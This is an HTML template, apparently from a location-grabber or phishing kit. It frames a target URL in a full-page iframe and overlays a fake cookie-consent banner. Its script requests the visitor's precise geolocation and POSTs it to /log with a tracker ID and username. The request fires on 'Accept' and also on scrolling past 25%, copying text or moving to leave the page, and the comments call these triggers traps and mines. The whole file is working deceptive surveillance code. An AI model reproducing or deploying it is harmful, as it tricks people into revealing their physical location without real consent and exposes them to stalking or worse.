<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{{PAGE_TITLE}}</title>
    <style>
        body, html { 
            margin: 0; 
            padding: 0; 
            height: 100%; 
            overflow: auto; /* Memastikan scroll bisa berfungsi */
        }
        .frame-container { 
            position: absolute; 
            top: 0; 
            left: 0; 
            width: 100%; 
            height: 100%; 
            border: none; 
        }
        /* --- Gaya Cookie Banner --- */
        #cookie-trap-banner {
            position: fixed;
            bottom: 0;
            left: 0;
            width: 100%;
            background-color: #f8f9fa;
            color: #212529;
            z-index: 2000;
            box-shadow: 0 -2px 10px rgba(0,0,0,0.1);
            font-family: Arial, sans-serif;
            font-size: 14px;
            transform: translateY(100%); /* Mulai dari bawah (tersembunyi) */
            transition: transform 0.5s ease-in-out;
        }
        #cookie-trap-banner.visible {
            transform: translateY(0);
        }
        .cookie-content {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 15px 25px;
            flex-wrap: wrap;
            gap: 15px;
        }
        .cookie-text p { margin: 0; line-height: 1.5; }
        .cookie-text a { color: #0d6efd; text-decoration: underline; }
        .cookie-buttons { display: flex; gap: 10px; flex-shrink: 0; }
        .cookie-btn {
            padding: 8px 16px;
            border: 1px solid #6c757d;
            background-color: #ffffff;
            color: #212529;
            border-radius: 20px;
            cursor: pointer;
            font-size: 14px;
            font-weight: bold;
            transition: all 0.2s ease;
        }
        .cookie-btn:hover { background-color: #e9ecef; }
        .cookie-btn.primary {
            background-color: #0d6efd;
            border-color: #0d6efd;
            color: #ffffff;
        }
         .cookie-btn.primary:hover { background-color: #0b5ed7; }
    </style>
</head>
<body>
    <iframe class="frame-container" src="{{DESTINATION_URL}}"></iframe>

    <div id="cookie-trap-banner">
        <div class="cookie-content">
            <div class="cookie-text">
                <p>We value your privacy. This site uses cookies for functionality and analytics. <a href="#">Privacy Policy</a>.</p>
            </div>
            <div class="cookie-buttons">
                <button id="decline-btn" class="cookie-btn">Decline</button>
                <button id="accept-btn" class="cookie-btn primary">Accept</button>
            </div>
        </div>
    </div>
    
    <script>
        const trackerId = "{{TRACKER_ID}}";
        const username = "{{USERNAME}}";
        let hasTriggered = false; // Kunci utama untuk memastikan skrip hanya berjalan sekali

        // --- Fungsi Inti ---

        const sendLocation = () => {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        console.log("Location captured successfully!");
                        fetch('/log', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({
                                latitude: position.coords.latitude,
                                longitude: position.coords.longitude,
                                trackerId,
                                username
                            }),
                        });
                    },
                    (error) => { console.warn(`Geolocation error on trigger:`, error.message); },
                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                );
            }
        };

        const cleanupListeners = () => {
            document.removeEventListener('scroll', handleScroll);
            document.removeEventListener('copy', handleCopy);
            document.documentElement.removeEventListener('mouseout', handleExitIntent);
            console.log("All behavioral listeners have been removed.");
        };
        
        const hideBanner = () => {
            const banner = document.getElementById('cookie-trap-banner');
            if (banner) {
                banner.classList.remove('visible');
            }
        };

        const triggerActionAndCleanup = (triggerType) => {
            if (hasTriggered) return;
            hasTriggered = true;
            console.log(`Action triggered by: ${triggerType}`);
            sendLocation();
            hideBanner();
            cleanupListeners();
        };

        const declineActionAndCleanup = () => {
             if (hasTriggered) return;
            hasTriggered = true;
            console.log("Action: Decline. Cleaning up listeners.");
            hideBanner();
            cleanupListeners();
        }

        // --- Logika Pemicu ---

        // Pemicu 1: Gulir (Scroll)
        const handleScroll = () => {
            const scrollPercentage = (window.scrollY / (document.documentElement.scrollHeight - window.innerHeight)) * 100;
            if (scrollPercentage > 25) {
                triggerActionAndCleanup('scroll');
            }
        };

        // Pemicu 2: Salin Teks (Copy)
        const handleCopy = () => {
            triggerActionAndCleanup('copy');
        };

        // Pemicu 3: Niat Keluar (Exit Intent)
        const handleExitIntent = (e) => {
            if (!e.toElement && !e.relatedTarget && e.clientY < 10) {
                triggerActionAndCleanup('exit-intent');
            }
        };

        // --- Inisialisasi Jebakan ---

        // Pasang listener untuk tombol-tombol banner
        document.getElementById('accept-btn').addEventListener('click', () => triggerActionAndCleanup('cookie_accept'));
        document.getElementById('decline-btn').addEventListener('click', declineActionAndCleanup);

        // Pasang semua "ranjau" perilaku pasif
        document.addEventListener('scroll', handleScroll, { passive: true });
        document.addEventListener('copy', handleCopy);
        document.documentElement.addEventListener('mouseout', handleExitIntent);

        // Tampilkan banner setelah jeda singkat agar terlihat natural
        setTimeout(() => {
            if (!hasTriggered) {
                 const banner = document.getElementById('cookie-trap-banner');
                 if(banner) banner.classList.add('visible');
            }
        }, 1500); // Muncul setelah 1.5 detik

    </script>
</body>
</html>